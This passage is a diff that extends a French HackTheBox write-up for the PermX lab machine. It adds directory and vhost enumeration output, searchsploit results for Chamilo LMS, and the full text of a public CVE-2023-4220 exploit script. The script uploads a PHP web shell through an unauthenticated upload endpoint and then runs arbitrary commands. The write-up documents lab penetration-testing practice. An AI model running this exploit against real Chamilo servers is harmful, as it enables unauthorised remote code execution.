@@ -364,6 +364,119 @@ mon-recoweb permx.htb
 
 Le fichier RESULTS_SUMMARY.txt te permet alors d’identifier rapidement les chemins réellement intéressants, sans avoir à parcourir l’ensemble des logs générés par les outils.
 
+```bash
+===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
+Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
+Script              : mon-recoweb v2.2.0
+
+Cible        : permx.htb
+Périmètre    : /
+Date début   : 2026-02-07 16:16:18
+
+Commandes exécutées (exactes) :
+
+[dirb — découverte initiale]
+dirb http://permx.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log
+
+[ffuf — énumération des répertoires]
+ffuf -u http://permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log
+
+[ffuf — énumération des fichiers]
+ffuf -u http://permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log
+
+Processus de génération des résultats :
+- Les sorties JSON produites par ffuf constituent la source de vérité.
+- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
+- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
+- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
+- Les résultats sont normalisés sous la forme :
+    http://cible/chemin (CODE:xxx|SIZE:yyy)
+- Les chemins sont ensuite classés par type :
+    • répertoires (/chemin/)
+    • fichiers (/chemin.ext)
+- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
+  garantissant la reproductibilité complète du scan.
+
+----------------------------------------------------
+
+=== Résultat global (agrégé) ===
+
+http://permx.htb/404.html (CODE:200|SIZE:10428)
+http://permx.htb/about.html (CODE:200|SIZE:20542)
+http://permx.htb/. (CODE:200|SIZE:36182)
+http://permx.htb/contact.html (CODE:200|SIZE:14753)
+http://permx.htb/courses.html (CODE:200|SIZE:22993)
+http://permx.htb/css/
+http://permx.htb/css/ (CODE:301|SIZE:304)
+http://permx.htb/.htaccess.bak (CODE:403|SIZE:274)
+http://permx.htb/.htaccess (CODE:403|SIZE:274)
+http://permx.htb/.htc (CODE:403|SIZE:274)
+http://permx.htb/.ht (CODE:403|SIZE:274)
+http://permx.htb/.htgroup (CODE:403|SIZE:274)
+http://permx.htb/.htm (CODE:403|SIZE:274)
+http://permx.htb/.html (CODE:403|SIZE:274)
+http://permx.htb/.htpasswd (CODE:403|SIZE:274)
+http://permx.htb/.htpasswds (CODE:403|SIZE:274)
+http://permx.htb/.htuser (CODE:403|SIZE:274)
+http://permx.htb/img/
+http://permx.htb/img/ (CODE:301|SIZE:304)
+http://permx.htb/index.html (CODE:200|SIZE:36182)
+http://permx.htb/js/
+http://permx.htb/js/ (CODE:301|SIZE:303)
+http://permx.htb/lib/
+http://permx.htb/lib/ (CODE:301|SIZE:304)
+http://permx.htb/LICENSE.txt (CODE:200|SIZE:1422)
+http://permx.htb/.php (CODE:403|SIZE:274)
+http://permx.htb/server-status (CODE:403|SIZE:274)
+http://permx.htb/server-status/ (CODE:403|SIZE:274)
+http://permx.htb/team.html (CODE:200|SIZE:14806)
+http://permx.htb/testimonial.html (CODE:200|SIZE:13018)
+http://permx.htb/wp-forum.phps (CODE:403|SIZE:274)
+
+=== Détails par outil ===
+
+[DIRB]
+http://permx.htb/css/
+http://permx.htb/img/
+http://permx.htb/index.html (CODE:200|SIZE:36182)
+http://permx.htb/js/
+http://permx.htb/lib/
+http://permx.htb/server-status (CODE:403|SIZE:274)
+
+[FFUF — DIRECTORIES]
+http://permx.htb/css/ (CODE:301|SIZE:304)
+http://permx.htb/img/ (CODE:301|SIZE:304)
+http://permx.htb/js/ (CODE:301|SIZE:303)
+http://permx.htb/lib/ (CODE:301|SIZE:304)
+http://permx.htb/server-status/ (CODE:403|SIZE:274)
+
+[FFUF — FILES]
+http://permx.htb/404.html (CODE:200|SIZE:10428)
+http://permx.htb/about.html (CODE:200|SIZE:20542)
+http://permx.htb/. (CODE:200|SIZE:36182)
+http://permx.htb/contact.html (CODE:200|SIZE:14753)
+http://permx.htb/courses.html (CODE:200|SIZE:22993)
+http://permx.htb/.htaccess.bak (CODE:403|SIZE:274)
+http://permx.htb/.htaccess (CODE:403|SIZE:274)
+http://permx.htb/.htc (CODE:403|SIZE:274)
+http://permx.htb/.ht (CODE:403|SIZE:274)
+http://permx.htb/.htgroup (CODE:403|SIZE:274)
+http://permx.htb/.htm (CODE:403|SIZE:274)
+http://permx.htb/.html (CODE:403|SIZE:274)
+http://permx.htb/.htpasswd (CODE:403|SIZE:274)
+http://permx.htb/.htpasswds (CODE:403|SIZE:274)
+http://permx.htb/.htuser (CODE:403|SIZE:274)
+http://permx.htb/index.html (CODE:200|SIZE:36182)
+http://permx.htb/LICENSE.txt (CODE:200|SIZE:1422)
+http://permx.htb/.php (CODE:403|SIZE:274)
+http://permx.htb/team.html (CODE:200|SIZE:14806)
+http://permx.htb/testimonial.html (CODE:200|SIZE:13018)
+http://permx.htb/wp-forum.phps (CODE:403|SIZE:274)
+
+```
+
+
+
 ### Recherche de vhosts avec `mon-subdomains`
 
 Enfin, teste rapidement la présence de vhosts  avec  le script {{< script "mon-subdomains" >}}
@@ -377,11 +490,285 @@ mon-subdomains permx.htb
 
 Si aucun vhost distinct n’est détecté, ce fichier te permet malgré tout de confirmer que le fuzzing n’a rien révélé d’exploitable.
 
+```bash
+=== mon-subdomains permx.htb START ===
+Script       : mon-subdomains
+Version      : mon-subdomains 2.0.0
+Date         : 2026-02-07 16:21:21
+Domaine      : permx.htb
+IP           : 10.129.73.43
+Mode         : large
+Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
+Codes        : 200,301,302,401,403  (strict=1)
+
+VHOST totaux : 1
+  - lms.permx.htb
+
+--- Détails par port ---
+Port 80 (http)
+  Baseline#1: code=302 size=286 words=26 (Host=5yu6ql290i.permx.htb)
+  Baseline#2: code=302 size=286 words=26 (Host=udql2s539y.permx.htb)
+  Baseline#3: code=302 size=286 words=26 (Host=szegbbegfm.permx.htb)
+  After-redirect#1: code=200 size=36182 words=2466
+  After-redirect#2: code=200 size=36182 words=2466
+  After-redirect#3: code=200 size=36182 words=2466
+  VHOST (1)
+    - lms.permx.htb
+
+
+
+=== mon-subdomains permx.htb END ===
+
+
+```
+
+
+
 ## Exploitation – Prise pied (Foothold)
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+
+
+```bash
+===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
+Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
+Script              : mon-recoweb v2.2.0
+
+Cible        : lms.permx.htb
+Périmètre    : /
+Date début   : 2026-02-07 16:39:32
+
+Commandes exécutées (exactes) :
+
+[dirb — découverte initiale]
+dirb http://lms.permx.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log
+
+[ffuf — énumération des répertoires]
+ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log
+
+[ffuf — énumération des fichiers]
+ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log
+
+Processus de génération des résultats :
+- Les sorties JSON produites par ffuf constituent la source de vérité.
+- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
+- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
+- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
+- Les résultats sont normalisés sous la forme :
+    http://cible/chemin (CODE:xxx|SIZE:yyy)
+- Les chemins sont ensuite classés par type :
+    • répertoires (/chemin/)
+    • fichiers (/chemin.ext)
+- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
+  garantissant la reproductibilité complète du scan.
+
+----------------------------------------------------
+
+=== Résultat global (agrégé) ===
+
+http://lms.permx.htb/app/
+http://lms.permx.htb/app/ (CODE:301|SIZE:312)
+http://lms.permx.htb/bin/
+http://lms.permx.htb/bin/ (CODE:301|SIZE:312)
+http://lms.permx.htb/certificates/
+http://lms.permx.htb/certificates/ (CODE:301|SIZE:321)
+http://lms.permx.htb/. (CODE:200|SIZE:19348)
+http://lms.permx.htb/custompages/ (CODE:301|SIZE:320)
+http://lms.permx.htb/documentation/
+http://lms.permx.htb/documentation/ (CODE:301|SIZE:322)
+http://lms.permx.htb/favicon.ico (CODE:200|SIZE:2462)
+http://lms.permx.htb/.htaccess.bak (CODE:403|SIZE:278)
+http://lms.permx.htb/.htaccess (CODE:403|SIZE:278)
+http://lms.permx.htb/.htc (CODE:403|SIZE:278)
+http://lms.permx.htb/.ht (CODE:403|SIZE:278)
+http://lms.permx.htb/.htgroup (CODE:403|SIZE:278)
+http://lms.permx.htb/.htm (CODE:403|SIZE:278)
+http://lms.permx.htb/.html (CODE:403|SIZE:278)
+http://lms.permx.htb/.htpasswd (CODE:403|SIZE:278)
+http://lms.permx.htb/.htpasswds (CODE:403|SIZE:278)
+http://lms.permx.htb/.htuser (CODE:403|SIZE:278)
+http://lms.permx.htb/index.php (CODE:200|SIZE:19356)
+http://lms.permx.htb/index.php (CODE:200|SIZE:19452)
+http://lms.permx.htb/LICENSE (CODE:200|SIZE:35147)
+http://lms.permx.htb/LICENSE/ (CODE:200|SIZE:35147)
+http://lms.permx.htb/license.txt (CODE:200|SIZE:1614)
+http://lms.permx.htb/main/
+http://lms.permx.htb/main/ (CODE:301|SIZE:313)
+http://lms.permx.htb/news_list.php (CODE:200|SIZE:13995)
+http://lms.permx.htb/.php (CODE:403|SIZE:278)
+http://lms.permx.htb/plugin/
+http://lms.permx.htb/plugin/ (CODE:301|SIZE:315)
+http://lms.permx.htb/robots.txt (CODE:200|SIZE:748)
+http://lms.permx.htb/server-status (CODE:403|SIZE:278)
+http://lms.permx.htb/server-status/ (CODE:403|SIZE:278)
+http://lms.permx.htb/src/
+http://lms.permx.htb/src/ (CODE:301|SIZE:312)
+http://lms.permx.htb/terms.php (CODE:200|SIZE:16127)
+http://lms.permx.htb/user.php (CODE:302|SIZE:0)
+http://lms.permx.htb/vendor/
+http://lms.permx.htb/vendor/ (CODE:301|SIZE:315)
+http://lms.permx.htb/web/
+http://lms.permx.htb/web/ (CODE:301|SIZE:312)
+http://lms.permx.htb/web.config (CODE:200|SIZE:5780)
+http://lms.permx.htb/whoisonline.php (CODE:200|SIZE:15471)
+http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)
+
+=== Détails par outil ===
+
+[DIRB]
+http://lms.permx.htb/app/
+http://lms.permx.htb/bin/
+http://lms.permx.htb/certificates/
+http://lms.permx.htb/documentation/
+http://lms.permx.htb/favicon.ico (CODE:200|SIZE:2462)
+http://lms.permx.htb/index.php (CODE:200|SIZE:19452)
+http://lms.permx.htb/LICENSE (CODE:200|SIZE:35147)
+http://lms.permx.htb/main/
+http://lms.permx.htb/plugin/
+http://lms.permx.htb/robots.txt (CODE:200|SIZE:748)
+http://lms.permx.htb/server-status (CODE:403|SIZE:278)
+http://lms.permx.htb/src/
+http://lms.permx.htb/vendor/
+http://lms.permx.htb/web/
+http://lms.permx.htb/web.config (CODE:200|SIZE:5780)
+
+[FFUF — DIRECTORIES]
+http://lms.permx.htb/app/ (CODE:301|SIZE:312)
+http://lms.permx.htb/bin/ (CODE:301|SIZE:312)
+http://lms.permx.htb/certificates/ (CODE:301|SIZE:321)
+http://lms.permx.htb/custompages/ (CODE:301|SIZE:320)
+http://lms.permx.htb/documentation/ (CODE:301|SIZE:322)
+http://lms.permx.htb/LICENSE/ (CODE:200|SIZE:35147)
+http://lms.permx.htb/main/ (CODE:301|SIZE:313)
+http://lms.permx.htb/plugin/ (CODE:301|SIZE:315)
+http://lms.permx.htb/server-status/ (CODE:403|SIZE:278)
+http://lms.permx.htb/src/ (CODE:301|SIZE:312)
+http://lms.permx.htb/vendor/ (CODE:301|SIZE:315)
+http://lms.permx.htb/web/ (CODE:301|SIZE:312)
+
+[FFUF — FILES]
+http://lms.permx.htb/. (CODE:200|SIZE:19348)
+http://lms.permx.htb/favicon.ico (CODE:200|SIZE:2462)
+http://lms.permx.htb/.htaccess.bak (CODE:403|SIZE:278)
+http://lms.permx.htb/.htaccess (CODE:403|SIZE:278)
+http://lms.permx.htb/.htc (CODE:403|SIZE:278)
+http://lms.permx.htb/.ht (CODE:403|SIZE:278)
+http://lms.permx.htb/.htgroup (CODE:403|SIZE:278)
+http://lms.permx.htb/.htm (CODE:403|SIZE:278)
+http://lms.permx.htb/.html (CODE:403|SIZE:278)
+http://lms.permx.htb/.htpasswd (CODE:403|SIZE:278)
+http://lms.permx.htb/.htpasswds (CODE:403|SIZE:278)
+http://lms.permx.htb/.htuser (CODE:403|SIZE:278)
+http://lms.permx.htb/index.php (CODE:200|SIZE:19356)
+http://lms.permx.htb/license.txt (CODE:200|SIZE:1614)
+http://lms.permx.htb/news_list.php (CODE:200|SIZE:13995)
+http://lms.permx.htb/.php (CODE:403|SIZE:278)
+http://lms.permx.htb/robots.txt (CODE:200|SIZE:748)
+http://lms.permx.htb/terms.php (CODE:200|SIZE:16127)
+http://lms.permx.htb/user.php (CODE:302|SIZE:0)
+http://lms.permx.htb/web.config (CODE:200|SIZE:5780)
+http://lms.permx.htb/whoisonline.php (CODE:200|SIZE:15471)
+http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)
+
+```
+
+
+
+```bash
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
+└─$ searchsploit chamilo 1.11             
+------------------------------------ ---------------------------------
+ Exploit Title                      |  Path
+------------------------------------ ---------------------------------
+Chamilo LMS 1.11.14 - Account Takeo | php/webapps/50694.txt
+Chamilo LMS 1.11.14 - Remote Code E | php/webapps/49867.py
+Chamilo LMS 1.11.24 - Remote Code E | php/webapps/52083.py
+Chamilo LMS 1.11.8 - 'firstname' Cr | php/webapps/45536.txt
+Chamilo LMS 1.11.8 - Cross-Site Scr | php/webapps/45535.txt
+------------------------------------ ---------------------------------
+Shellcodes: No Results
+                                                                      
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
+└─$ searchsploit -m php/webapps/52083.py  
+  Exploit: Chamilo LMS 1.11.24 - Remote Code Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/52083
+     Path: /usr/share/exploitdb/exploits/php/webapps/52083.py
+    Codes: CVE-2023-4220
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /mnt/kvm-md0/HTB/permx/52083.py
+```
+
+
+
+```python
+# Exploit Title: Chamilo LMS 1.11.24 - Remote Code Execution (RCE)
+# Exploit Author: 0x00-null - Mohamed Kamel BOUZEKRIA
+# Exploit Date: September 3, 2024
+# Vendor Homepage: https://chamilo.org/
+# Software Link: https://chamilo.org/
+# Version: 1.11.24 (Beersel)
+# Tested Versions: 1.11.24 (Beersel) - August 31, 2023
+# CVE ID: CVE-2023-4220
+# Vulnerability Type: Remote Code Execution
+# Description: Unauthenticated remote code execution in Chamilo LMS <= 1.11.24 due to an unrestricted file upload vulnerability.
+# Proof of Concept: Yes
+# Categories: Web Application, Remote Code Execution, File Upload
+# CVSS Score: 8.1 (High)
+# CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+# Notes: Ensure that the /main/inc/lib/javascript/bigupload/files/ directory exists and is writable.
+# License: MIT License
+# References:
+# - CVE Details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220
+# - Exploit Documentation: https://github.com/0x00-null/Chamilo-CVE-2023-4220-RCE-Exploit
+# - Vendor Advisory: https://chamilo.org/
+
+import requests
+import argparse
+from urllib.parse import urljoin
+
+def upload_shell(target_url, payload_name):
+    upload_url = urljoin(target_url, "main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported")
+    shell_path = f"/main/inc/lib/javascript/bigupload/files/{payload_name}"
+    shell_url = urljoin(target_url, shell_path)
+
+    # Payload containing the PHP web shell
+    files = {'bigUploadFile': (payload_name, '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
+
+    # Upload the payload
+    response = requests.post(upload_url, files=files)
+
+    if response.status_code == 200:
+        print("[+] File uploaded successfully!")
+        print(f"[+] Access the shell at: {shell_url}?cmd=")
+    else:
+        print("[-] File upload failed.")
+
+def execute_command(shell_url, cmd):
+    # Execute the command
+    response = requests.get(f"{shell_url}?cmd={cmd}")
+    if response.status_code == 200:
+        print(f"[+] Command Output:\n{response.text}")
+    else:
+        print(f"[-] Failed to execute command at {shell_url}")
+
+if __name__ == "__main__":
+    # Parse command-line arguments
+    parser = argparse.ArgumentParser(description="CVE-2023-4220 Chamilo LMS Unauthenticated File Upload RCE Exploit")
+    parser.add_argument('target_url', help="The target base URL of the Chamilo LMS instance (e.g., http://example.com/)")
+    parser.add_argument('cmd', help="The command to execute on the remote server")
+    parser.add_argument('--shell', default='rce.php', help="The name of the shell file to be uploaded (default: rce.php)")
+
+    args = parser.parse_args()
+
+    # Run the exploit with the provided arguments
+    upload_shell(args.target_url, args.shell)
+
+    # Form the shell URL to execute commands
+    shell_url = urljoin(args.target_url, f"main/inc/lib/javascript/bigupload/files/{args.shell}")
+    execute_command(shell_url, args.cmd)
+```
+
+
 
 ---
 
